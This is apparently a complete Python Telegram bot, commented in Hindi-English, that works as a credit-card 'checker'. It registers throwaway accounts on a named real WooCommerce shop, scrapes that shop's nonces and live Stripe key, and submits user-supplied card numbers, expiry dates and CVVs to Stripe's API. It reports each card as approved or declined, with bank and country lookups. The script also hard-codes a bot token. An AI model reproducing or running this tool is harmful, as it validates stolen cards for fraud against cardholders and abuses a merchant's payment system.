import requests
import re
import time
import telebot
from telebot import types
import os
import base64
import user_agent

# Aapko 'getuseragent' ki zaroorat nahi hai agar aap 'user_agent' istemal kar rahe hain.
# from getuseragent import UserAgent 

# --- Bot Setup ---
# Apne bot ka token yahan daalein
bot = telebot.TeleBot('8013822756:AAEq28T0zQFlUf_w3QXIcgIep4Sd4g3_Fc0')


def reg(card_details):
    """Card format ko check karta hai."""
    pattern = r'^\d{16}\|\d{2}\|\d{4}\|\d{3}$'
    if re.match(pattern, card_details):
        return card_details
    return 'None'


def brn6(ccx):
    """Stripe check karne wala main function."""
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        # Ek hi session object banayein sabhi requests ke liye
        r = requests.Session()
        
        # User-Agent generate karein
        generated_user_agent = user_agent.generate_user_agent()
        
        # --- Request 1: Get Register Nonce ---
        headers1 = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer': 'https://shop.wiseacrebrew.com/',
            'user-agent': generated_user_agent,
        }
        response1 = r.get('https://shop.wiseacrebrew.com/account/', headers=headers1)
        register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response1.text).group(1)
        
        # --- Request 2: Register User ---
        headers2 = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/account/',
            'user-agent': generated_user_agent,
        }
        data2 = {
            'email': f'testuser{int(time.time())}@example.com',
            'password': 'somepassword123',
            'woocommerce-register-nonce': register,
            '_wp_http_referer': '/account/',
            'register': 'Register',
        }
        r.post('https://shop.wiseacrebrew.com/account/', headers=headers2, data=data2)
        
        # --- Request 3: Get Payment Method Page for Nonce and Key ---
        headers3 = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer': 'https://shop.wiseacrebrew.com/account/',
            'user-agent': generated_user_agent,
        }
        response3 = r.get('https://shop.wiseacrebrew.com/account/add-payment-method/', headers=headers3)
        nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response3.text).group(1)
        key = re.search(r'"key":"(pk_live_[^"]+)"', response3.text).group(1)
        
        # --- Request 4: Stripe API to get Payment Method ID ---
        headers4 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': generated_user_agent,
        }
        data4 = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&key={key}'
        response4 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers4, data=data4)
        
        # Check if Stripe returned an error
        if 'error' in response4.json():
            error_message = response4.json()['error'].get('message', 'Stripe API Error')
            return f"Declined ({error_message})"
            
        tok = response4.json()['id']
        
        # --- Request 5: Final Confirmation on Website ---
        headers5 = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
            'user-agent': generated_user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }
        params5 = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data5 = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': tok,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        response5 = r.post('https://shop.wiseacrebrew.com/', params=params5, headers=headers5, data=data5)
        
        msg = response5.text
        if 'succeeded' in msg or 'requires_capture' in msg:
            return 'Approved'
        else:
            # Decline reason ko dhoondhne ki koshish karein
            decline_match = re.search(r'"message":"([^"]+)"', msg)
            if decline_match:
                return f"Declined ({decline_match.group(1)})"
            return 'Declined'

    except Exception as e:
        # Agar koi bhi step fail hota hai, to error return karein
        print(f"Error during check: {e}") # Yeh error aapke console mein dikhega
        return 'Error (Check failed)'


@bot.message_handler(func=lambda message: message.text.lower().startswith('.st') or message.text.lower().startswith('/st'))
def respond_to_vbv(message):
    gate = '𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝🔁'
    ko = bot.reply_to(message, "⏳ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...").message_id
    
    # Card details command se ya reply kiye gaye message se lein
    cc_text = message.reply_to_message.text if message.reply_to_message else message.text
    # Command (.st /st) ko hata dein
    if cc_text.lower().startswith(('.st', '/st')):
        parts = cc_text.split(maxsplit=1)
        cc_text = parts[1] if len(parts) > 1 else ''

    cc = str(reg(cc_text))
    
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
        Please ensure you enter the card details in the correct format:
        Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return

    start_time = time.time()
    
    last = brn6(cc)
    
    try:
        data = requests.get('https://bins.antipublic.cc/bins/' + cc[:6]).json()
    except Exception as e:
        data = {} # Agar BIN API fail ho to empty data rakhein

    brand = data.get('brand', 'Unknown')
    card_type = data.get('type', 'Unknown')
    country = data.get('country_name', 'Unknown')
    country_flag = data.get('country_flag', '🏳️')
    bank = data.get('bank', 'Unknown')

    end_time = time.time()
    execution_time = end_time - start_time

    if last == 'Approved':
        msg = f'''<b>✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅</b>	   
<b>[↯] 𝗖𝗖 ⇾</b> <code>{cc}</code>
<b>[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾</b> {gate}
<b>[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →</b> {last}
<b>[↯] 𝗕𝗜𝗡 →</b> {cc[:6]} - {card_type} - {brand}
<b>[↯] 𝗕𝗮𝗻𝗸 →</b> {bank}
<b>[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →</b> {country} {country_flag}
<b>[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾</b> {"{:.1f}".format(execution_time)} seconds.
<b>𝗕𝗼𝘁 𝗕𝘆 ⇾</b> @Rar_Xd'''
    else:
        msg = f'''<b>❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌</b>	   
<b>[↯] 𝗖𝗖 ⇾</b> <code>{cc}</code>
<b>[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾</b> {gate}
<b>[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →</b> {last}
<b>[↯] 𝗕𝗜𝗡 →</b> {cc[:6]} - {card_type} - {brand}
<b>[↯] 𝗕𝗮𝗻𝗸 →</b> {bank}
<b>[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →</b> {country} {country_flag}
<b>[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾</b> {"{:.1f}".format(execution_time)} seconds.
<b>𝗕𝗼𝘁 𝗕𝘆 ⇾</b> @Rar_Xd'''
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

print("                          Bot Start On ✅  ")
bot.polling()
